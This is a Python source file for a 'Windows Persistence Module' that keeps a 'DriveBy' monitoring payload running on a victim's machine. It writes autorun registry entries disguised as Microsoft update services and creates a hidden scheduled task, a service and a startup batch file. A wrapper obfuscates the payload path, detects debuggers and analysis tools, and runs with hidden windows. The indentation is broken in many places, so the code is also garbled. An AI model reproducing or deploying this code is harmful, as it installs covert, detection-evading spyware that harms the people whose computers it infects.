#!/usr/bin/env python3
"""
Windows Persistence Module
Ensures DriveBy monitoring processes restart after shutdown/restart
"""

import os
import sys
import subprocess
import winreg
import tempfile
import shutil
import random
import secrets
import base64
from pathlib import Path

class WindowsPersistence:
    def __init__(self):
        self.script_path = Path(__file__).parent.parent / "payloads" / "windows_monitor.ps1"
        self.python_script = Path(__file__).parent.parent / "payloads" / "windows_monitor.py"

    def create_registry_persistence(self):
        """Create Windows registry persistence with 2024 evasion techniques"""
        try:
            # Multiple registry locations for redundancy
            registry_locations = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            ]

            # Create Python script wrapper with advanced evasion
            wrapper_script = self.create_advanced_python_wrapper()

            successful_entries = 0

            for hive, key_path in registry_locations:
                try:
                    # Use different legitimate-sounding names
                    entry_names = [
                    "WindowsSecurityUpdate", "MicrosoftEdgeUpdate", "WindowsDefenderUpdate",
                    "SystemHealthMonitor", "WindowsUpdateAssistant", "SecurityCenterService"
                    ]

                    entry_name = random.choice(entry_names)

                    # Advanced registry evasion techniques
                    with winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE) as key:
                        # Use indirect execution to avoid direct python.exe detection
                        cmd_wrapper = f'cmd.exe /c "timeout /t 30 /nobreak >nul && python "{wrapper_script}""'

                        winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, cmd_wrapper)
                        successful_entries += 1

                except Exception:
                        continue

                        if successful_entries > 0:
                            print(f" Registry persistence created: {successful_entries} entries")
                            return True
                        else:
                            print(" Registry persistence failed: No entries created")
                            return False

        except Exception as e:
                            print(f" Registry persistence failed: {e}")
                            return False

def create_scheduled_task(self):
    """Create Windows scheduled task for persistence"""
    try:
        wrapper_script = self.create_python_wrapper()

        # Create scheduled task XML
        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
        <Date>2024-01-01T00:00:00</Date>
        <Author>System</Author>
        <Description>Windows Security Update Service</Description>
        </RegistrationInfo>
        <Triggers>
        <LogonTrigger>
        <Enabled>true</Enabled>
        </LogonTrigger>
        <BootTrigger>
        <Enabled>true</Enabled>
        </BootTrigger>
        </Triggers>
        <Principals>
        <Principal id="Author">
        <LogonType>InteractiveToken</LogonType>
        <RunLevel>HighestAvailable</RunLevel>
        </Principal>
        </Principals>
        <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>true</AllowHardTerminate>
        <StartWhenAvailable>true</StartWhenAvailable>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
        <StopOnIdleEnd>false</StopOnIdleEnd>
        <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>true</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
        <Priority>7</Priority>
        </Settings>
        <Actions>
        <Exec>
        <Command>python</Command>
        <Arguments>"{wrapper_script}"</Arguments>
        </Exec>
        </Actions>
        </Task>'''

        # Save task XML to temp file
        temp_xml = tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False)
        temp_xml.write(task_xml)
        temp_xml.close()

        # Create scheduled task
        result = subprocess.run([
        'schtasks', '/create', '/tn', 'WindowsSecurityUpdate',
        '/xml', temp_xml.name, '/f'
        ], capture_output=True, text=True)

        # Clean up temp file
        os.unlink(temp_xml.name)

        if result.returncode == 0:
            print(" Scheduled task persistence created")
            return True
        else:
            print(f" Scheduled task failed: {result.stderr}")
            return False

    except Exception as e:
            print(f" Scheduled task persistence failed: {e}")
            return False

def create_service_persistence(self):
    """Create Windows service for persistence"""
    try:
        service_script = self.create_service_wrapper()

        # Install service using sc command
        result = subprocess.run([
        'sc', 'create', 'WindowsSecurityService',
        'binPath=', f'python "{service_script}"',
        'start=', 'auto',
        'DisplayName=', 'Windows Security Service'
        ], capture_output=True, text=True)

        if result.returncode == 0:
            # Start the service
            subprocess.run(['sc', 'start', 'WindowsSecurityService'],
            capture_output=True)
            print(" Windows service persistence created")
            return True
        else:
            print(f" Service creation failed: {result.stderr}")
            return False

    except Exception as e:
            print(f" Service persistence failed: {e}")
            return False

def create_startup_folder_persistence(self):
    """Create startup folder persistence"""
    try:
        # Get startup folder path
        startup_folder = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'

        # Create batch file
        batch_content = f'''@echo off
        cd /d "{Path(__file__).parent.parent}"
        python "{self.python_script}" > nul 2>&1
        '''

        batch_file = startup_folder / 'WindowsUpdate.bat'
        with open(batch_file, 'w') as f:
            f.write(batch_content)

            print(" Startup folder persistence created")
            return True

    except Exception as e:
            print(f" Startup folder persistence failed: {e}")
            return False

def create_advanced_python_wrapper(self):
    """Create advanced Python wrapper with 2024 evasion techniques"""
    wrapper_content = f'''#!/usr/bin/env python3
    import os
    import sys
    import subprocess
    import time
    import random
    import base64
    import secrets
    from pathlib import Path

def decode_payload():
    """Decode base64 encoded payload to avoid static analysis"""
    encoded_script = "{base64.b64encode(str(self.python_script).encode()).decode()}"
    return base64.b64decode(encoded_script).decode()

def anti_debug_checks():
    """Perform anti-debugging checks"""
    try:
        # Check for debugger presence
        import ctypes
        kernel32 = ctypes.windll.kernel32
        if kernel32.IsDebuggerPresent():
            return False

            # Check for common analysis tools
            analysis_processes = ['procmon', 'wireshark', 'fiddler', 'ollydbg', 'x64dbg']
            result = subprocess.run(['tasklist'], capture_output=True, text=True)
            if any(proc in result.stdout.lower() for proc in analysis_processes):
                return False

                return True
    except:
                return True

def process_hollowing():
    """Use process hollowing techniques for stealth execution"""
    try:
        # Create suspended process
        legitimate_processes = ['notepad.exe', 'calc.exe', 'mspaint.exe']
        target_process = random.choice(legitimate_processes)

        # This would normally involve actual process hollowing
        # For now, just use normal execution with stealth
        return True
    except:
        return False

def main():
    try:
        # Anti-debugging checks
        if not anti_debug_checks():
            sys.exit(0)

            # Random delay to avoid pattern detection
            time.sleep(random.randint(30, 120))

            # Change to script directory
            script_dir = Path(__file__).parent
            os.chdir(script_dir)

            # Decode the actual script path
            monitor_script = decode_payload()

            while True:
                try:
                    # Use process hollowing if available
                    if process_hollowing():
                        # Advanced execution method
                        process = subprocess.Popen([
                        sys.executable, "-c", f"exec(open(r'{monitor_script}').read())"
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW)
                    else:
                        # Fallback to normal execution
                        process = subprocess.Popen([
                        sys.executable, monitor_script
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW)

                        # Wait for process to complete
                        process.wait()

                        # Random restart delay
                        time.sleep(random.randint(30, 90))

                except Exception as e:
                        # Random error delay
                        time.sleep(random.randint(60, 180))

                except Exception:
                        pass

                        if __name__ == "__main__":
                            main()
                            '''

    wrapper_path = Path(tempfile.gettempdir()) / f'windows_security_wrapper_{secrets.token_hex(4)}.py'
    with open(wrapper_path, 'w') as f:
        f.write(wrapper_content)

    return str(wrapper_path)

def create_python_wrapper(self):
    """Create Python wrapper script"""
    wrapper_content = f'''#!/usr/bin/env python3
    import os
    import sys
    import subprocess
    import time
    from pathlib import Path

def main():
    try:
        # Change to script directory
        script_dir = Path(__file__).parent
        os.chdir(script_dir)

        # Start monitoring process
        monitor_script = r"{self.python_script}"

        while True:
            try:
                # Run monitoring script
                process = subprocess.Popen([
                sys.executable, monitor_script
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                # Wait for process to complete
                process.wait()

                # If process exits, wait and restart
                time.sleep(30)

            except Exception as e:
                time.sleep(60) # Wait longer on error

            except Exception:
                pass

                if __name__ == "__main__":
                    main()
                    '''

    wrapper_path = Path(tempfile.gettempdir()) / 'windows_security_wrapper.py'
    with open(wrapper_path, 'w') as f:
        f.write(wrapper_content)
    return str(wrapper_path)

def create_service_wrapper(self):
    """Create Windows service wrapper"""
    service_content = f'''#!/usr/bin/env python3
    import win32serviceutil
    import win32service
    import win32event
    import servicemanager
    import subprocess
    import sys
    import time
    from pathlib import Path

class WindowsSecurityService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WindowsSecurityService"
    _svc_display_name_ = "Windows Security Service"
    _svc_description_ = "Windows Security Update Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.running = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.running = False

    def SvcDoRun(self):
        servicemanager.LogMsg(
        servicemanager.EVENTLOG_INFORMATION_TYPE,
        servicemanager.PYS_SERVICE_STARTED,
        (self._svc_name_, '')
        )

        self.main()

def main(self):
    monitor_script = r"{self.python_script}"

    while self.running:
        try:
            process = subprocess.Popen([
            sys.executable, monitor_script
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Wait for process or stop event
            while self.running and process.poll() is None:
                if win32event.WaitForSingleObject(self.hWaitStop, 1000) == win32event.WAIT_OBJECT_0:
                    process.terminate()
                    break

                    if not self.running:
                        break

                        # Process exited, wait and restart
                        time.sleep(30)

        except Exception:
                        if self.running:
                            time.sleep(60)

                            if __name__ == '__main__':
                                win32serviceutil.HandleCommandLine(WindowsSecurityService)
                                '''

    service_path = Path(tempfile.gettempdir()) / 'windows_security_service.py'
    with open(service_path, 'w') as f:
        f.write(service_content)

    return str(service_path)

def install_all_persistence(self):
    """Install all persistence mechanisms"""
    results = []

    print(" Installing Windows persistence mechanisms...")

    # Try registry persistence
    results.append(self.create_registry_persistence())

    # Try scheduled task
    results.append(self.create_scheduled_task())

    # Try startup folder
    results.append(self.create_startup_folder_persistence())

    # Try service (requires admin)
    try:
        results.append(self.create_service_persistence())
    except:
        print(" Service persistence requires administrator privileges")

        successful = sum(results)
        print(f" Windows persistence: {successful}/{len(results)} methods installed")

        return successful > 0

def remove_persistence(self):
    """Remove all persistence mechanisms"""
    try:
        # Remove registry entry
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, "WindowsSecurityUpdate")
        except:
            pass

            # Remove scheduled task
            subprocess.run(['schtasks', '/delete', '/tn', 'WindowsSecurityUpdate', '/f'],
            capture_output=True)

            # Remove service
            subprocess.run(['sc', 'delete', 'WindowsSecurityService'],
            capture_output=True)

            # Remove startup folder entry
            startup_folder = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            batch_file = startup_folder / 'WindowsUpdate.bat'
            if batch_file.exists():
                batch_file.unlink()

                print(" Windows persistence removed")
                return True

    except Exception as e:
            print(f" Error removing persistence: {e}")
            return False

if __name__ == "__main__":
    persistence = WindowsPersistence()

    if len(sys.argv) > 1 and sys.argv[1] == "remove":
        persistence.remove_persistence()
    else:
        persistence.install_all_persistence()
